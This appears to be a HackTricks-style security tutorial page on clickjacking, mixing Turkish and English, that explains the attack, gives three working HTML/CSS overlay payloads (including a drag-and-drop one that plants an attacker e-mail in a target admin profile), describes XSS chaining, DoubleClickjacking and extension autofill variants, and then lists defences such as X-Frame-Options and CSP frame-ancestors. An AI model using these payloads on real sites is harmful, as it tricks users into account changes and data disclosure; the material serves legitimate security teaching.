# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Clickjacking Nedir

Bir clickjacking saldırısında, bir **kullanıcı** **kandırılır** ve bir web sayfasındaki ya **görünmez** ya da farklı bir **öğe** gibi gizlenmiş bir öğeye **tıklaması** sağlanır. Bu manipulasyon kullanıcının istemediği sonuçlara yol açabilir; örneğin malware indirilmesi, kötü amaçlı web sayfalarına yönlendirme, kimlik bilgileri veya hassas bilgilerin verilmesi, para transferleri veya çevrimiçi ürün satın alımları.

### Formları Önceden Doldurma Hilesi

Bazen bir sayfa yüklenirken **GET parameters kullanarak bir formun alanlarının değerlerini doldurmak** mümkün olabilir. Bir saldırgan bu davranışı kötüye kullanarak bir formu rastgele verilerle doldurabilir ve clickjacking payload'ını göndererek kullanıcının Submit düğmesine basmasını sağlayabilir.

### Drag\&Drop ile Form Doldurma

Eğer kullanıcının bir **formu doldurmasını** istiyorsanız ama ona doğrudan belirli bilgileri (bildiğiniz e-posta adresi veya belirli bir şifre gibi) yazmasını söylemek istemiyorsanız, ona kontrolünüzdeki verileri yazacak bir şeyi **Drag\&Drop** etmesini isteyebilirsiniz; bunun bir örneği için [**bu örnek**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/) adresine bakın.

### Temel Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Çok Aşamalı Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Tıklama payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

If you have identified an **XSS attack that requires a user to click** on some element to **trigger** the XSS and the page is **vulnerable to clickjacking**, you could abuse it to trick the user into clicking the button/link.\
Example:\
You found a **self XSS** in some private details of the account (details that **only you can set and read**). The page with the **form** to set these details is **vulnerable** to **Clickjacking** and you can **prepopulate** the **form** with the GET parameters.\
An attacker could prepare a **Clickjacking** attack to that page **prepopulating** the **form** with the **XSS payload** and **tricking** the **user** into **Submit** the form. So, **when the form is submitted** and the values are modified, the **user will execute the XSS**.

### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), this technique would ask the victim to double click on a button of a custom page placed in a specific location, and use the timing differences between mousedown and onclick events to load the victim page duing the double click so the **victim actually clicks a legit button in the victim page**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> This technique allows to trick the user to click on 1 place in the victim page bypassing every protection against clickjacking. So the attacker needs to find **sensitive actions that can be done with just 1 click, like OAuth prompts accepting permissions**.

### Browser extensions: DOM-based autofill clickjacking

Aside from iframing victim pages, attackers can target browser extension UI elements that are injected into the page. Password managers render autofill dropdowns near focused inputs; by focusing an attacker-controlled field and hiding/occluding the extension’s dropdown (opacity/overlay/top-layer tricks), a coerced user click can select a stored item and fill sensitive data into attacker-controlled inputs. This variant requires no iframe exposure and works entirely via DOM/CSS manipulation.

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

Scripts executed on the client side can perform actions to prevent Clickjacking:

- Ensuring the application window is the main or top window.
- Making all frames visible.
- Preventing clicks on invisible frames.
- Detecting and alerting users to potential Clickjacking attempts.

However, these frame-busting scripts may be circumvented:

- **Browsers' Security Settings:** Some browsers might block these scripts based on their security settings or lack of JavaScript support.
- **HTML5 iframe sandbox Attribute:** An attacker can neutralize frame buster scripts by setting the sandbox attribute with allow-forms or allow-scripts values without allow-top-navigation. This prevents the iframe from verifying if it is the top window, e.g.,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
allow-forms ve allow-scripts değerleri, üst düzey navigasyonu devre dışı bırakırken iframe içinde eylemlere izin verir. Hedeflenen sitenin beklenen işlevselliğini sağlamak için, saldırı türüne bağlı olarak allow-same-origin ve allow-modals gibi ek izinler gerekebilir. Hangi izinlerin verilmesi gerektiği konusunda tarayıcı konsolu mesajları yol gösterici olabilir.

### Server-Side Defenses

#### X-Frame-Options

The **X-Frame-Options HTTP response header** tarayıcılara bir sayfanın <frame> veya <iframe> içinde render edilmesinin meşru olup olmadığını bildirir ve Clickjacking'i önlemeye yardımcı olur:

- X-Frame-Options: deny - Hiçbir domain içeriği çerçeveleyemez.
- X-Frame-Options: sameorigin - Yalnızca aynı site içeriği çerçeveleyebilir.
- X-Frame-Options: allow-from https://trusted.com - Yalnızca belirtilen 'uri' sayfayı çerçeveleyebilir.
- Sınırlamalara dikkat: tarayıcı bu yönergeyi desteklemiyorsa çalışmayabilir. Bazı tarayıcılar CSP frame-ancestors yönergesini tercih eder.

#### Content Security Policy (CSP) frame-ancestors directive

**frame-ancestors directive in CSP** Clickjacking koruması için önerilen yöntemdir:

- frame-ancestors 'none' - X-Frame-Options: deny ile benzer.
- frame-ancestors 'self' - X-Frame-Options: sameorigin ile benzer.
- frame-ancestors trusted.com - X-Frame-Options: allow-from ile benzer.

Örneğin, aşağıdaki CSP yalnızca aynı alan adından framelenmesine izin verir:

Content-Security-Policy: frame-ancestors 'self';

Daha fazla ayrıntı ve karmaşık örnekler için [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) ve [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) bölümüne bakın.

### Content Security Policy (CSP) with child-src and frame-src

**Content Security Policy (CSP)**, tarayıcının hangi kaynaklardan içerik yüklemesine izin verileceğini belirleyerek Clickjacking ve diğer kod enjeksiyon saldırılarına karşı yardımcı olan bir güvenlik önlemidir.

#### frame-src Directive

- Defines valid sources for frames.
- More specific than the default-src directive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Bu politika aynı origin (self) ve https://trusted-website.com adresinden gelen frame'lere izin verir.

#### child-src Yönergesi

- CSP seviye 2'de, web workers ve frame'ler için geçerli kaynakları belirlemek amacıyla tanıtıldı.
- frame-src ve worker-src için bir yedek (fallback) olarak davranır.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Bu politika aynı origin (self) ve https://trusted-website.com kaynaklarından gelen frames ve workers için izin verir.

**Kullanım Notları:**

- Kullanımdan kaldırma: child-src, frame-src ve worker-src lehine kademeli olarak kaldırılıyor.
- Yedek Davranışı: Eğer frame-src yoksa, child-src frame'ler için yedek olarak kullanılır. Her ikisi de yoksa default-src kullanılır.
- Sıkı Kaynak Tanımı: İstismarı önlemek için yönergelere yalnızca güvenilen kaynakları ekleyin.

#### JavaScript Frame-Breaking Scriptleri

Tamamen kusursuz olmasa da, JavaScript tabanlı frame-busting script'ler bir web sayfasının çerçevelenmesini önlemek için kullanılabilir. Örnek:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Anti-CSRF Tokens Kullanımı

- **Token Doğrulama:** Web uygulamalarında anti-CSRF tokens kullanın; durum değiştiren isteklerin kullanıcı tarafından kasıtlı yapıldığından ve bir Clickjacked sayfa aracılığıyla yapılmadığından emin olun.

## Referanslar

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
